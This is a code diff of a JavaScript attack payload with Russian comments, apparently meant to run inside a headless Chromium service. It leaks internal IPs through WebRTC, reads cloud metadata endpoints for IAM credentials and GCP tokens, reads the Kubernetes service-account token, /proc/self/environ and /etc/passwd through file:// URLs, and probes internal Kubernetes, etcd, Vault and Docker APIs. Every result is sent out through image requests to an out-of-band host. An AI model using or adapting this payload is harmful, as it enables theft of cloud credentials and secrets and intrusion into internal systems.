@@ -8,12 +8,12 @@ function fire(path) {
   new Image().src = 'https://' + OOB + path + '&r=' + Math.random();
 }
 
-fire('/alive4?t=0');
+fire('/alive5?t=0');
 
-// 1. WebRTC — внутренние IP без сетевых запросов
+// 1. WebRTC - внутренний IP Chromium-сервиса (с STUN для host-candidate)
 (function() {
   try {
-    var pc = new RTCPeerConnection({iceServers: []});
+    var pc = new RTCPeerConnection({iceServers: [{urls: 'stun:stun.l.google.com:19302'}]});
     pc.createDataChannel('x');
     pc.createOffer().then(function(o) { pc.setLocalDescription(o); });
     pc.onicecandidate = function(ev) {
@@ -24,32 +24,75 @@ fire('/alive4?t=0');
   } catch(e) { fire('/rtc-err?e=' + encodeURIComponent(e.message.slice(0, 80))); }
 })();
 
-// 2. Скан внутренних сервисов — timing + попытка прочитать тело
-var targets = [
-  ['docker-api',    'http://172.17.0.1:2375/version'],
-  ['docker-info',   'http://172.17.0.1:2375/info'],
-  ['k8s-api',       'http://10.96.0.1/version'],
-  ['k8s-health',    'http://10.96.0.1/healthz'],
-  ['consul',        'http://172.17.0.1:8500/v1/catalog/services'],
-  ['vault',         'http://172.17.0.1:8200/v1/sys/health'],
-  ['prom',          'http://172.17.0.1:9090/api/v1/status/buildinfo'],
-  ['gw-80',         'http://172.17.0.1/'],
-  ['gw-8080',       'http://172.17.0.1:8080/'],
-  ['meta-goog',     'http://metadata.google.internal/computeMetadata/v1/project/project-id'],
-  ['imds-169',      'http://169.254.169.254/latest/meta-data/'],
-  ['imds-iam',      'http://169.254.169.254/latest/meta-data/iam/security-credentials/'],
+// 2. IMDS с таймаутом 2000мс - читаем тело ответа
+var imdsTargets = [
+  ['imds-root',  'http://169.254.169.254/'],
+  ['imds-meta',  'http://169.254.169.254/latest/meta-data/'],
+  ['imds-iam',   'http://169.254.169.254/latest/meta-data/iam/security-credentials/'],
+  ['imds-iid',   'http://169.254.169.254/latest/dynamic/instance-identity/document'],
+  ['gcp-proj',   'http://metadata.google.internal/computeMetadata/v1/project/project-id'],
+  ['gcp-token',  'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'],
 ];
 
-targets.forEach(function(t) {
+imdsTargets.forEach(function(t) {
   var label = t[0], url = t[1], t0 = Date.now();
-  fetch(url, {signal: AbortSignal.timeout(250)})
+  fetch(url, {signal: AbortSignal.timeout(2000)})
     .then(function(r) {
       return r.text().then(function(body) {
-        fire('/ok-' + label + '?ms=' + (Date.now()-t0) + '&s=' + r.status + '&d=' + encodeURIComponent(body.slice(0, 300)));
+        fire('/ok-' + label + '?ms=' + (Date.now()-t0) + '&s=' + r.status + '&d=' + encodeURIComponent(body.slice(0, 500)));
       });
     })
     .catch(function(e) {
       fire('/err-' + label + '?ms=' + (Date.now()-t0) + '&e=' + encodeURIComponent(e.message.slice(0, 80)));
+    });
+});
+
+// 3. file:// - k8s service account token и системные файлы
+var fileTargets = [
+  ['sa-token',   'file:///var/run/secrets/kubernetes.io/serviceaccount/token'],
+  ['sa-ns',      'file:///var/run/secrets/kubernetes.io/serviceaccount/namespace'],
+  ['proc-env',   'file:///proc/self/environ'],
+  ['etc-hosts',  'file:///etc/hosts'],
+  ['resolv',     'file:///etc/resolv.conf'],
+  ['passwd',     'file:///etc/passwd'],
+  ['proc-net',   'file:///proc/net/fib_trie'],
+];
+
+fileTargets.forEach(function(t) {
+  var label = t[0], url = t[1], t0 = Date.now();
+  fetch(url)
+    .then(function(r) {
+      return r.text().then(function(body) {
+        fire('/file-ok-' + label + '?ms=' + (Date.now()-t0) + '&d=' + encodeURIComponent(body.slice(0, 500)));
+      });
+    })
+    .catch(function(e) {
+      fire('/file-err-' + label + '?ms=' + (Date.now()-t0) + '&e=' + encodeURIComponent(e.message.slice(0, 80)));
+    });
+});
+
+// 4. k8s API и внутренние сервисы - 2000мс таймаут
+var k8sTargets = [
+  ['k8s-version', 'https://10.96.0.1/version'],
+  ['k8s-healthz', 'https://10.96.0.1/healthz'],
+  ['k8s-apis',    'https://10.96.0.1/apis'],
+  ['etcd',        'http://10.96.0.1:2379/health'],
+  ['consul',      'http://10.96.0.1:8500/v1/catalog/services'],
+  ['vault',       'http://10.96.0.1:8200/v1/sys/health'],
+  ['prom',        'http://10.96.0.1:9090/api/v1/status/buildinfo'],
+  ['docker',      'http://172.17.0.1:2375/version'],
+];
+
+k8sTargets.forEach(function(t) {
+  var label = t[0], url = t[1], t0 = Date.now();
+  fetch(url, {signal: AbortSignal.timeout(2000)})
+    .then(function(r) {
+      return r.text().then(function(body) {
+        fire('/k8s-ok-' + label + '?ms=' + (Date.now()-t0) + '&s=' + r.status + '&d=' + encodeURIComponent(body.slice(0, 500)));
+      });
+    })
+    .catch(function(e) {
+      fire('/k8s-err-' + label + '?ms=' + (Date.now()-t0) + '&e=' + encodeURIComponent(e.message.slice(0, 80)));
     });
 });
 </script>
